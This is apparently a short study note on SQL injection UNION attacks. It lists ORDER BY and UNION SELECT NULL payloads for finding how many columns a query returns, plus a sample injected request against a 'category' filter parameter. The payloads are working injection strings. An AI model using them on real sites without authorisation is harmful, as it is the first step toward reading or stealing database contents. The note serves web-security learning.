---
description: >-
  When you perform a SQL injection UNION attack, there are two effective methods
  to determine how many columns are being returned from the original query.
---

# Union |number of columns

```
# method:01
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.

#method:02
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.


```

PRATICAL

```
#  order by based find the number of columns
/filter?category=Gifts' ORDER BY 4--

##if u got any error on 4th column then they are only 3-columns

# union based find the number of columns (u can tyr this on burp only)


```

